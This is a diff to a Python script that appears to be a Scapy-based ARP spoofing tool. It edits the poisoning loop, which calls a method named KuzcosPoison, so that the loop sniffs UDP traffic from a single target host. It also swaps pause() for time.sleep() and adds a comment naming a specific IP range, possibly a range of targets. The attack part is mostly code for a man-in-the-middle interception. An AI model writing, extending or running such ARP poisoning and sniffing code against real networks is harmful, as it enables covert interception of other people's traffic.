@@ -1,9 +1,7 @@
+#192.64.168.0 - 192.64.175.255
+import time
 def LeagueCanceller(pkt):
-    print(f'The packets name: {pkt.name}')
-    print(f'The packets payload: {pkt.payload}')
-    print(f'The packets payload guess: {pkt.payload_guess}')
-    print(f'The packets route: {pkt.route()}')
-    print(f'Packet.show(): {pkt.show()}')
+    print(pkt.summary())
 
 class PreAttack(object):
     def __init__(self, targ, iface):
@@ -70,13 +68,13 @@ def Rosie(interface, gWayT, target, fwd):
        try:
            try:
                Attack(targets, interface).KuzcosPoison(MACs)
-               sniff(count=20, prn=LeagueCanceller)
+               sniff(count=5, prn=LeagueCanceller, filter=f'udp and host {targets[1]}')
                #sniff(prn=lambda x:x.summary(), count=1)
            except Exception:
                print('Failed to poison')
                sys.exit(1)
            print('poison sent to %s and %s' %(targets[0], targets[1]))
-           pause(2.5)
+           time.sleep(2.5)
        except KeyboardInterrupt:
            break;
     #fix the ARP tables
@@ -87,7 +85,7 @@ def Rosie(interface, gWayT, target, fwd):
         except(Exception, KeyboardInterrupt):
             print('[FUCK]')
             sys.exit(1)
-        pause(2)
+        time.sleep(2)
     print('[POGGED]')
     try:
         if fwd:
